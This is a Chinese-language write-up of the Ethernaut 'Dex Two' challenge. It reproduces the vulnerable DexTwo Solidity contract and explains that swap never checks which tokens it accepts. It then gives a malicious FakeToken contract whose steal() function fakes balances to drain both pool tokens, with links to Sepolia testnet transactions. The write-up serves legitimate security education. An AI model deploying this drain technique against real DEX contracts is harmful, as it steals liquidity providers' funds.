# Level 23: Dex Two

## 1. 问题

转走 `DexTwo` 合约中 `token1`, `token2` 的余额（全部取出），使得他后续无法继续提供双向的兑换服务

<details>
<summary>点击展开原始问题说明</summary>
    
As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

</details>

## 2. 解题思路

`DexTwo` 对比 `Dex`, 缺少了 `swap` 内对于 `from`, `to` 的地址校验，我们可以通过搞一个自己掌控的 token，换出 `DexTwo` 中持有的有价值的 `token1`, `token2`j

## 3. 执行步骤

1. [部署我们的 `FakeToken`](https://sepolia.etherscan.io/tx/0x9f84f7331effc329ceb6dc9479f59f5c157990b5bef68e38301e4da966a5bc6f), 核心逻辑如下：

```solidity
contract FakeToken {
    mapping(address account => uint256) private _balances;
    DexTwoI private dexTwo;

    // 省略掉被 DexTwo 调用时必须要继承的一些 ERC-20 的接口
    // ....
    
    function steal() public {
        uint256 amt = dexTwo.balanceOf(dexTwo.token1(), address(dexTwo));
        // 让 DexTwo以为汇率是 1:1
        _balances[address(dexTwo)] = amt;
        // 让 FakeToken 合约恰好持有这么多余额来做兑换
        _balances[address(this)] = amt;
        // 用自己的 FakeToken， 换 Token1
        dexTwo.swap(address(this), dexTwo.token1(), amt);
        
        // Token2 如法炮制
        amt = dexTwo.balanceOf(dexTwo.token2(), address(dexTwo));
        // 让 DexTwo以为汇率是 1:1
        _balances[address(dexTwo)] = amt;
        // 让 FakeToken 合约恰好持有这么多余额来做兑换
        _balances[address(this)] = amt;
        // 用自己的 FakeToken， 换 Token2
        dexTwo.swap(address(this), dexTwo.token2(), amt);
    }
}
```


> [!NOTE]
> 完整可编译部署的代码见 [DexTwo.sol](./dextwo.sol)

2. [调用 `FakeToken.steal()`](https://sepolia.etherscan.io/tx/0xce53469350457a2c1e1f736a3745a90bffbdf0156a749721fc46b9924839540a), 取出 `DexTwo` 的全部余额
   1. 每次设置 `amt` 恰好等于 `DexTwo` 持有的 `TokenX` 的余额, 是为了让 `getSwapAmount` 认为汇率是 `1:1`
   2. 每次设置 `FakeToken` 自身也要持有他发行的 token，是 `1:1` 兑换需要。`DexTwo` 有多少，`FakeToken` 也要有多少，才能保证能把 `TokenX` 按比例全部兑换出来
   3. 严格说 `Steal` 不一定要在 `FakeToken` 内实现，任意一个合约，或者用 EOA 发起多笔交易，也可以达到同样效果。这里我们简化实现
   
4. [Submit instance](https://sepolia.etherscan.io/tx/0x0e816f7801d3d71b2340ed55c9d884297a8031d16a4517e3e2e44bd80dc41c55), 通过！


<br/>
<br/>

| [⬅️ level22 Dex](../level22_dex/README.md) | [level24 Puzzle Wallet ➡️](../level24_puzzle_wallet/README.md) |
| :----------------------------------------------- | ------------------------------------------: |